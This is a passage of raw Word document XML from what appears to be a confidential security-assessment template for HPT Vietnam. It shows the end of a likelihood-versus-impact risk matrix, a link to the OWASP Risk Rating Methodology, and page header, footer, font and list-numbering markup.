              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>MEDIUM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2171" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7B91F262" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2172" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="290C9C5A" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2172" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="63D7012F" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A21264" w:rsidRPr="002F7E5E" w14:paraId="52C18107" w14:textId="77777777" w:rsidTr="000F54D3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1838" w:type="dxa"/>
            <w:vMerge/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="46C83D69" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0AE8ACA1" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>LOW</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2171" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="C5E0B3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1B335AE8" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Note</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2172" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1C333586" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2172" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="739914D7" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A21264" w:rsidRPr="002F7E5E" w14:paraId="59AB2B81" w14:textId="77777777" w:rsidTr="000F54D3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1838" w:type="dxa"/>
            <w:vMerge/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="647FCC5F" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1985" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15D048C2" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2171" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7283F1B2" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>LOW</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2172" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="4ADC34D9" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>MEDIUM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2172" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7CE433FB" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:spacing w:after="120"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>HIGH</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A21264" w:rsidRPr="002F7E5E" w14:paraId="0269E095" w14:textId="77777777" w:rsidTr="000F54D3">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1838" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="16B0CF81" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="00A21264" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="8500" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="181540F6" w14:textId="77777777" w:rsidR="00A21264" w:rsidRPr="002F7E5E" w:rsidRDefault="000F54D3" w:rsidP="0030517C">
            <w:pPr>
              <w:pStyle w:val="Content"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7E5E">
              <w:rPr>
                <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                <w:b/>
                <w:sz w:val="22"/>
              </w:rPr>
              <w:t>LIKELIHOOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="32D964FC" w14:textId="77777777" w:rsidR="0002083C" w:rsidRDefault="0002083C" w:rsidP="0091053E"/>
    <w:p w14:paraId="5903DB82" w14:textId="77777777" w:rsidR="0091053E" w:rsidRDefault="0091053E" w:rsidP="0091053E">
      <w:r>
        <w:t xml:space="preserve">For the detail of the rating method, please refer at: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0408F168" w14:textId="77777777" w:rsidR="00363892" w:rsidRPr="00323A5F" w:rsidRDefault="00977C8B" w:rsidP="0091053E">
      <w:hyperlink r:id="rId24" w:history="1">
        <w:r w:rsidR="0091053E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://www.owasp.org/index.php/OWASP_Risk_Rating_Methodology</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00363892">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6621DAD3" w14:textId="77777777" w:rsidR="00363892" w:rsidRPr="00A74CE6" w:rsidRDefault="00363892" w:rsidP="00363892"/>
    <w:sectPr w:rsidR="00363892" w:rsidRPr="00A74CE6" w:rsidSect="00CC4809">
      <w:type w:val="continuous"/>
      <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
      <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="7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3B0E4" w14:textId="77777777" w:rsidR="00977C8B" w:rsidRDefault="00977C8B">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="10609A74" w14:textId="77777777" w:rsidR="00977C8B" w:rsidRDefault="00977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NewRomanPS">
    <w:altName w:val="Times New Roman"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="00000003" w:usb1="00000000" w:usb2="00000000" w:usb3="00000000" w:csb0="00000001" w:csb1="00000000"/>
  </w:font>
  <w:font w:name="OpenSymbol">
    <w:altName w:val="Arial Unicode MS"/>
    <w:charset w:val="8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B1444" w14:textId="77777777" w:rsidR="0030517C" w:rsidRPr="001446F0" w:rsidRDefault="0030517C" w:rsidP="005430E5">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:jc w:val="center"/>
      <w:rPr>
        <w:color w:val="0000FF"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:color w:val="0000FF"/>
      </w:rPr>
      <w:t>HCMC, xx/20xx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509C5" w14:textId="77777777" w:rsidR="0030517C" w:rsidRPr="00196125" w:rsidRDefault="0030517C" w:rsidP="00165B5D">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:pBdr>
        <w:top w:val="single" w:sz="4" w:space="5" w:color="auto"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="8640"/>
        <w:tab w:val="left" w:pos="0"/>
        <w:tab w:val="right" w:pos="9100"/>
      </w:tabs>
      <w:rPr>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
      <w:t>&lt;Tên hồ sơ giải pháp&gt;</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
      <w:tab/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
      <w:tab/>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00B79" w14:textId="77777777" w:rsidR="0030517C" w:rsidRDefault="003051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1FE2" w14:textId="77777777" w:rsidR="0030517C" w:rsidRPr="00BF131D" w:rsidRDefault="0030517C" w:rsidP="00BF131D">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:tabs>
        <w:tab w:val="clear" w:pos="4320"/>
        <w:tab w:val="clear" w:pos="8640"/>
        <w:tab w:val="right" w:pos="9214"/>
      </w:tabs>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A3279" w14:textId="77777777" w:rsidR="0030517C" w:rsidRDefault="0030517C" w:rsidP="00165B5D">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:pBdr>
        <w:top w:val="single" w:sz="4" w:space="5" w:color="auto"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="8640"/>
        <w:tab w:val="left" w:pos="0"/>
        <w:tab w:val="right" w:pos="9100"/>
      </w:tabs>
      <w:rPr>
        <w:rStyle w:val="PageNumber"/>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00BB56A6">
      <w:rPr>
        <w:i/>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
      <w:t>&lt;Tên hồ sơ giải pháp&gt;</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
      <w:tab/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
      <w:tab/>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7CEF2DA9" w14:textId="77777777" w:rsidR="0030517C" w:rsidRPr="00BB56A6" w:rsidRDefault="0030517C" w:rsidP="00976E60">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:pBdr>
        <w:top w:val="single" w:sz="4" w:space="5" w:color="auto"/>
      </w:pBdr>
      <w:tabs>
        <w:tab w:val="clear" w:pos="8640"/>
        <w:tab w:val="left" w:pos="0"/>
        <w:tab w:val="right" w:pos="9100"/>
      </w:tabs>
      <w:rPr>
        <w:i/>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00BB56A6">
      <w:rPr>
        <w:i/>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
      <w:t>&lt;Ver.: &gt; &lt;Ngày&gt;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644A3" w14:textId="77777777" w:rsidR="00F708DF" w:rsidRPr="00BF131D" w:rsidRDefault="00F708DF" w:rsidP="00CC4809">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:tabs>
        <w:tab w:val="clear" w:pos="4320"/>
        <w:tab w:val="clear" w:pos="8640"/>
        <w:tab w:val="right" w:pos="9214"/>
        <w:tab w:val="right" w:pos="9357"/>
      </w:tabs>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00BF131D">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>CONFIDENTIAL DOCUMENT</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>: &lt;KH&gt;</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:tab/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE  \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00760616">
      <w:rPr>
        <w:noProof/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>4</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>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8DDC0" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00BF131D" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:tabs>
        <w:tab w:val="clear" w:pos="4320"/>
        <w:tab w:val="clear" w:pos="8640"/>
        <w:tab w:val="right" w:pos="9214"/>
        <w:tab w:val="right" w:pos="9357"/>
      </w:tabs>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00BF131D">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>CONFIDENTIAL DOCUMENT</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>: &lt;KH&gt;</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:tab/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE  \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00760616">
      <w:rPr>
        <w:noProof/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>5</w:t>
    </w:r>
    <w:r>
      <w:rPr>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F70F5" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00BF131D" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:tabs>
        <w:tab w:val="clear" w:pos="4320"/>
        <w:tab w:val="clear" w:pos="8640"/>
        <w:tab w:val="right" w:pos="9214"/>
        <w:tab w:val="right" w:pos="9357"/>
      </w:tabs>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00BF131D">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>CONFIDENTIAL DOCUMENT</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>: &lt;KH&gt;</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:tab/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE  \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00760616">
      <w:rPr>
        <w:noProof/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>6</w:t>
    </w:r>
    <w:r>
      <w:rPr>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6ED8D" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00BF131D" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:tabs>
        <w:tab w:val="clear" w:pos="4320"/>
        <w:tab w:val="clear" w:pos="8640"/>
        <w:tab w:val="right" w:pos="9214"/>
        <w:tab w:val="right" w:pos="9357"/>
      </w:tabs>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
    </w:pPr>
    <w:r w:rsidRPr="00BF131D">
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>CONFIDENTIAL DOCUMENT</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>: &lt;KH&gt;</w:t>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:tab/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE  \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r>
      <w:rPr>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="002C21CD">
      <w:rPr>
        <w:noProof/>
        <w:sz w:val="18"/>
        <w:szCs w:val="18"/>
      </w:rPr>
      <w:t>12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1C382" w14:textId="77777777" w:rsidR="00977C8B" w:rsidRDefault="00977C8B">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="054A77DB" w14:textId="77777777" w:rsidR="00977C8B" w:rsidRDefault="00977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D0AC5" w14:textId="77777777" w:rsidR="0030517C" w:rsidRPr="008A3FAF" w:rsidRDefault="0030517C" w:rsidP="008A3FAF">
    <w:pPr>
      <w:pStyle w:val="Header"/>
      <w:pBdr>
        <w:bottom w:val="single" w:sz="4" w:space="6" w:color="auto"/>
      </w:pBdr>
      <w:rPr>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
    </w:pPr>
    <w:r>
      <w:rPr>
        <w:lang w:val="vi-VN"/>
      </w:rPr>
      <w:t>HPT Vietnam Co., Ltd.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59607" w14:textId="77777777" w:rsidR="0030517C" w:rsidRDefault="003051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6F652" w14:textId="77777777" w:rsidR="0030517C" w:rsidRDefault="003051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9FD66" w14:textId="77777777" w:rsidR="0030517C" w:rsidRDefault="00305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7.8pt;height:7.8pt" o:bullet="t">
        <v:imagedata r:id="rId1" o:title="Word Work File L_1265246123"/>
      </v:shape>
    </w:pict>
  </w:numPicBullet>
  <w:abstractNum w:abstractNumId="0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="003B0A7F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9D98786A"/>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E07"/>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67160"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C42E8C98"/>
    <w:lvl w:ilvl="0" w:tplc="156400BC">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Style5"/>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A138A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E52C454C"/>
    <w:lvl w:ilvl="0" w:tplc="D3F4CD1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290CF2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="2E561708"/>
    <w:lvl w:ilvl="0" w:tplc="07F22524">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Index11"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="34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C1B39"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="0430F738"/>
    <w:lvl w:ilvl="0" w:tplc="E4D2129C">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="BulletTable"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="227"/>
        </w:tabs>
        <w:ind w:left="227" w:hanging="227"/>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E01273"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="79B6A7A4"/>
    <w:lvl w:ilvl="0" w:tplc="FFFFFFFF">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="bullet1Char"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1080"/>
        </w:tabs>
        <w:ind w:left="1080" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
